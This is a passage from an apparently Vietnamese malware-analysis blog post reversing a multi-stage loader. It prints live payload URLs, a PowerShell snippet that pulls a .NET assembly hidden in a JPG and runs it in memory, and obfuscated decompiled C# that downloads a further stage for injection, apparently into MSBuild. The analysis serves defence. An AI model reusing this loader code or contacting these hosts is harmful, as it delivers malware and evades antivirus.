<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$originalText = <span class="string">&#x27;#x#.222/selif/#en.salij//:p##h&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>Sau đó khởi tạo biến <code>$restoredText</code> để replace các ký tự trong <code>$originalText</code>.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$restoredText = $originalText -replace <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;t&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>Sau quá trình trên, ta retrieve được một url.</p>
<blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="http://jilas.net/files/222.txt" >http://jilas.net/files/222.txt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>URL này chứa payload thứ 4, nó là một đoạn base64 bị reversed.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware6.png"
                      alt="image"
                ></p>
<p>Khi decode ra, ta thấy header là của một file PE.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware7.png"
                      alt="image"
                ></p>
<p>Tiếp tục phân tích đoạn powershell script.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$imageUrl = <span class="string">&#x27;https://res.cloudinary.com/daxwua63y/image/upload/v1738334533/alcb4htolzvfhzzufqh5.jpg&#x27;</span></span><br><span class="line">$webClient = <span class="title class_">New</span>-<span class="title class_">Object</span> <span class="title class_">System</span>.<span class="property">Net</span>.<span class="property">WebClient</span></span><br><span class="line">$imageBytes = $webClient.<span class="title class_">DownloadData</span>($imageUrl)</span><br><span class="line">$imageText = [<span class="title class_">System</span>.<span class="property">Text</span>.<span class="property">Encoding</span>]::<span class="title class_">UTF8</span>.<span class="title class_">GetString</span>($imageBytes)</span><br><span class="line">$startFlag = <span class="string">&#x27;&lt;&lt;BASE64_START&gt;&gt;&#x27;</span></span><br><span class="line">$endFlag = <span class="string">&#x27;&lt;&lt;BASE64_END&gt;&gt;&#x27;</span></span><br><span class="line">$startIndex = $imageText.<span class="title class_">IndexOf</span>($startFlag)</span><br><span class="line">$endIndex = $imageText.<span class="title class_">IndexOf</span>($endFlag)</span><br><span class="line">$startIndex -ge <span class="number">0</span> -and $endIndex -gt $startIndex</span><br><span class="line">$startIndex += $startFlag.<span class="property">Length</span></span><br><span class="line">$base64Length = $endIndex - $startIndex</span><br><span class="line">$base64Command = $imageText.<span class="title class_">Substring</span>($startIndex, $base64Length)</span><br></pre></td></tr></table></figure></div>

<p>Ta thấy nó biến <code>$imageUrl</code> lưu giá trị là một đoạn url đến một bức ảnh JPG. Sau đó nó sử dụng WebClient.DownloadData để download raw data của bức ảnh jpg về.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$imageBytes = $webClient.<span class="title class_">DownloadData</span>($imageUrl)</span><br></pre></td></tr></table></figure></div>

<p>Raw data sẽ được lưu vào biến <code>$imageBytes</code>, sau đó sẽ được chuyển thành chuỗi UTF-8 bằng <code>[System.Text.Encoding]::UTF8.GetString</code>.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$imageText = [<span class="title class_">System</span>.<span class="property">Text</span>.<span class="property">Encoding</span>]::<span class="title class_">UTF8</span>.<span class="title class_">GetString</span>($imageBytes)</span><br></pre></td></tr></table></figure></div>

<p>Tiếp theo tạo ra 2 biến <code>startFlag</code> và <code>endFlag</code> với chuỗi <code>&lt;&lt;BASE64_START&gt;&gt;</code> và <code>&lt;&lt;BASE64_END&gt;&gt;</code>.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$startFlag = <span class="string">&#x27;&lt;&lt;BASE64_START&gt;&gt;&#x27;</span></span><br><span class="line">$endFlag = <span class="string">&#x27;&lt;&lt;BASE64_END&gt;&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>Mục đích của nó là để tìm và trích xuất đoạn mã base64 được hide trong raw data của bức ảnh.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$startIndex = $imageText.<span class="title class_">IndexOf</span>($startFlag)</span><br><span class="line">$endIndex = $imageText.<span class="title class_">IndexOf</span>($endFlag)</span><br><span class="line">$startIndex -ge <span class="number">0</span> -and $endIndex -gt $startIndex</span><br><span class="line">$startIndex += $startFlag.<span class="property">Length</span></span><br><span class="line">$base64Length = $endIndex - $startIndex</span><br><span class="line">$base64Command = $imageText.<span class="title class_">Substring</span>($startIndex, $base64Length)</span><br></pre></td></tr></table></figure></div>

<p>Đây là một kỹ thuật <code>Steganography</code> nhằm ẩn thông tin ở đây là payload base64, tránh bị antivirus và các chương trình endpoint phát hiện.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware8.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware9.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware10.png"
                      alt="image"
                ></p>
<p>Sau khi đã trích xuất được đoạn base64 ẩn dấu bên trong file jpg. Nó sẽ được decode base64 thành mảng byte bằng <code>[System.Convert]::FromBase64String</code>.</p>
<p>Mảng byte này được nạp trực tiếp vào bộ nhớ như một assembly .NET bằng <code>[System.Reflection.Assembly]::Load</code>. Điều này cho thấy dữ liệu Base64 trong ảnh là một file thực thi PE (Portable Executable) dạng .NET assembly.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware11.png"
                      alt="image"
                ></p>
<p>Cuối cùng nó gọi <code>main method</code> trong class <code>ClassLibrary1.Home</code> của assembly vừa nạp với các tham số là <code>($restoredText, &#39;false&#39;, &#39;MSBuild&#39;, &#39;false&#39;)</code>. Ta sẽ cùng nhau decompile để phân tích nó.</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$type = [<span class="title class_">ClassLibrary1</span>.<span class="property">Home</span>].<span class="title class_">GetMethod</span>(<span class="string">&#x27;main&#x27;</span>).<span class="title class_">Invoke</span>($null, [object[]] @($restoredText,<span class="string">&#x27;false&#x27;</span>,<span class="string">&#x27;MSBuild&#x27;</span>,<span class="string">&#x27;false&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<h3 id="Reverse-1-1"><a href="#Reverse-1-1" class="headerlink" title="Reverse 1.1"></a>Reverse 1.1</h3><p>Ta sẽ decompile file PE .net assembly trước.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"></span><br><span class="line"><span class="meta">#nullable disable</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ClassLibrary1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Home</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">main</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="built_in">string</span> url,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="built_in">string</span> nativo,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="built_in">string</span> process_framework,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="built_in">string</span> process_native</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">label_5:</span><br><span class="line">      <span class="built_in">int</span> num1 = \uE00E.\uE006(<span class="number">15</span>);</span><br><span class="line">      <span class="built_in">object</span> obj;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">-20</span> &lt; <span class="number">35</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">int</span> num2 = <span class="number">-61</span>;</span><br><span class="line">        <span class="built_in">string</span> str1;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">int</span> num3 = num2 ^ \uE00E.\uE006(<span class="number">30</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">-10</span> &lt; <span class="number">15</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">switch</span> (num3 + <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">goto</span> label_5;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">string</span> str2;</span><br><span class="line">                <span class="built_in">string</span> str3;</span><br><span class="line">                <span class="built_in">bool</span> flag;</span><br><span class="line">                WebClient webClient;</span><br><span class="line">                <span class="keyword">switch</span> (num1)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">                    str3 = \uF184.\uF16F((<span class="built_in">object</span>) str2);</span><br><span class="line">                    num1 = <span class="number">7</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">                    flag = \uF186.\uF16F(nativo, \uE00D.\uE000(<span class="number">12463</span>));</span><br><span class="line">                    num1 = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">                    num1 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">                    num1 = <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">                    <span class="keyword">if</span> (flag)</span><br><span class="line">                    &#123;</span><br><span class="line">                      num1 = <span class="number">8</span>;</span><br><span class="line">                      <span class="keyword">goto</span> label_1;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                      <span class="keyword">goto</span> label_22;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">                    str2 = \uF183.\uF16F(\uF182.\uF16F(url));</span><br><span class="line">                    num1 = <span class="number">61</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">                    webClient = \uF17F.\uF16F();</span><br><span class="line">                    num1 = \uE00E.\uE006(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">                    str1 = \uF183.\uF16F(str1);</span><br><span class="line">                    num1 = <span class="number">62</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">                    \uF181.\uF16F((<span class="built_in">object</span>) webClient, \uF180.\uF16F());</span><br><span class="line">                    num1 = <span class="number">63</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">                    \uF17E.\uF16F((SecurityProtocolType) \uE00E.\uE006(<span class="number">21</span>));</span><br><span class="line">                    num1 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">                    str1 = \uF185.\uF16F((<span class="built_in">object</span>) webClient, str3);</span><br><span class="line">                    num1 = <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">goto</span> label_1;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">                    <span class="keyword">goto</span> label_21;</span><br><span class="line">                  <span class="literal">default</span>:</span><br><span class="line">                    num2 = <span class="number">-63</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">label_1:</span><br><span class="line">                num1 ^= \uE00E.\uE006(<span class="number">26</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="literal">default</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">-77</span> &lt; <span class="number">-47</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">goto</span> label_31;</span><br><span class="line">            &#125;</span><br><span class="line">            num2 = \uE018.\uE030(<span class="number">30</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">goto</span> label_31;</span><br><span class="line">        &#125;</span><br><span class="line">label_21:</span><br><span class="line">        <span class="built_in">int</span> num4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> label_23;</span><br><span class="line">label_22:</span><br><span class="line">        num4 = <span class="number">1</span>;</span><br><span class="line">label_23:</span><br><span class="line">        <span class="keyword">if</span> (num4 == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">label_25:</span><br><span class="line">          <span class="built_in">int</span> num5 = \uE00E.\uE006(<span class="number">24</span>);</span><br><span class="line">          <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">switch</span> (num5 ^ \uE00E.\uE006(<span class="number">29</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">27</span>:</span><br><span class="line">                Class1.Run(\uF170.\uF16F(\uE00D.\uE000(<span class="number">12459</span>), process_native, \uE00D.\uE000(<span class="number">12436</span>)), \uF187.\uF16F(str1));</span><br><span class="line">                num5 = <span class="number">63</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">                num5 = <span class="number">62</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">                <span class="keyword">goto</span> label_29;</span><br><span class="line">              <span class="literal">default</span>:</span><br><span class="line">                <span class="keyword">goto</span> label_25;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          Class1.Run(\uF170.\uF16F(\uE00D.\uE000(<span class="number">12433</span>), process_framework, \uE00D.\uE000(<span class="number">12436</span>)), \uF187.\uF16F(str1));</span><br><span class="line">label_29:</span><br><span class="line">        obj = (<span class="built_in">object</span>) <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">label_31:</span><br><span class="line">      <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Tại <code>ClassLibrary1.Home.main</code>, ta thấy hàm main sẽ nhận những tham số như sau.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">main</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="built_in">string</span> url,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="built_in">string</span> nativo,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="built_in">string</span> process_framework,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="built_in">string</span> process_native</span>)</span></span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>string url: Một chuỗi, có thể là URL.<br>string nativo: Một chuỗi kiểm tra điều kiện (ví dụ: “true” hoặc “false”).<br>string process_framework: Đường dẫn hoặc tên của một tiến trình framework.<br>string process_native: Đường dẫn hoặc tên của một tiến trình native.</p>
</blockquote>
<p>Tiếp tục phân tích, ở <code>Label_5</code> nó khởi tạo ra <code>num1</code>. Nó được gán một giá trị từ <code>\uE00E.\uE006(15)</code>.</p>
<p>Sau đó nó kiểm tra điều kiện <code>if (-20 &lt; 35)</code>, vì đây là điều kiện luôn đúng nên đoạn code bên trong sẽ được thực thi.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> num2 = <span class="number">-61</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> num3 = num2 ^ \uE00E.\uE006(<span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-10</span> &lt; <span class="number">15</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> (num3 + <span class="number">32</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">goto</span> label_5;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Logic chính</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Xử lý num1</span></span><br><span class="line">      <span class="literal">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    num2 = \uE018.\uE030(<span class="number">30</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">goto</span> label_31;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Bên trong nó khởi tạo <code>num2</code> và vòng lặp while (true). Vòng lặp này có nhiệm vụ khiến chương trình chỉ thực thi logic chính (case 1) khi <code>num2</code> đạt giá trị cụ thể.</p>
<p>Vậy ta sẽ phân tích logic chính của chương trình nằm ở <code>case 1</code>.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="built_in">string</span> str2;</span><br><span class="line">  <span class="built_in">string</span> str3;</span><br><span class="line">  <span class="built_in">bool</span> flag;</span><br><span class="line">  WebClient webClient;</span><br><span class="line">  <span class="keyword">switch</span> (num1)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">      str3 = \uF184.\uF16F((<span class="built_in">object</span>) str2);</span><br><span class="line">      num1 = <span class="number">7</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">      flag = \uF186.\uF16F(nativo, \uE00D.\uE000(<span class="number">12463</span>));</span><br><span class="line">      num1 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">      num1 = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">      num1 = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">      <span class="keyword">if</span> (flag)</span><br><span class="line">      &#123;</span><br><span class="line">        num1 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">goto</span> label_1;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">goto</span> label_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">      str2 = \uF183.\uF16F(\uF182.\uF16F(url));</span><br><span class="line">      num1 = <span class="number">61</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">      webClient = \uF17F.\uF16F();</span><br><span class="line">      num1 = \uE00E.\uE006(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">      str1 = \uF183.\uF16F(str1);</span><br><span class="line">      num1 = <span class="number">62</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">      \uF181.\uF16F((<span class="built_in">object</span>) webClient, \uF180.\uF16F());</span><br><span class="line">      num1 = <span class="number">63</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">      \uF17E.\uF16F((SecurityProtocolType) \uE00E.\uE006(<span class="number">21</span>));</span><br><span class="line">      num1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">      str1 = \uF185.\uF16F((<span class="built_in">object</span>) webClient, str3);</span><br><span class="line">      num1 = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">      <span class="keyword">goto</span> label_21;</span><br><span class="line">    <span class="literal">default</span>:</span><br><span class="line">      num2 = <span class="number">-63</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>Đọc source code, ta có thể thấy luồng thực thi của chương trình sẽ phụ thuộc vào <code>num1</code>. Sau mỗi case, num1 được gán giá trị mới và nhảy đến label_1, nơi <code>num1 ^= \uE00E.\uE006(26)</code> được xor để thay đổi giá trị <code>num1</code> trước khi quay lại switch.</p>
<p>Tiếp theo ta sẽ phân tích các case liên quan để xem hành vi của từng case là gì.</p>
<h4 id="Case-34"><a href="#Case-34" class="headerlink" title="Case 34:"></a>Case 34:</h4><div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">    str2 = \uF183.\uF16F(\uF182.\uF16F(url));</span><br><span class="line">    num1 = <span class="number">61</span>;</span><br><span class="line">    <span class="keyword">goto</span> label_1;</span><br></pre></td></tr></table></figure></div>

<p>Chuỗi url được đưa vào hàm <code>\uF182.\uF16F</code>, có thể là <code>Convert.FromBase64String</code>, để chuyển từ Base64 thành mảng byte.</p>
<p>Sau đó, mảng byte này được đưa vào hàm <code>\uF183.\uF16F</code>, có thể là <code>Encoding.UTF8.GetString</code>, để chuyển thành chuỗi UTF-8 và gán cho str2.</p>
<h4 id="Case-35"><a href="#Case-35" class="headerlink" title="Case 35:"></a>Case 35:</h4><div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">    webClient = \uF17F.\uF16F();</span><br><span class="line">    num1 = \uE00E.\uE006(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">goto</span> label_1;</span><br></pre></td></tr></table></figure></div>

<p>Hàm <code>\uF17F.\uF16F()</code> được gọi để tạo một instance mới của lớp WebClient.</p>
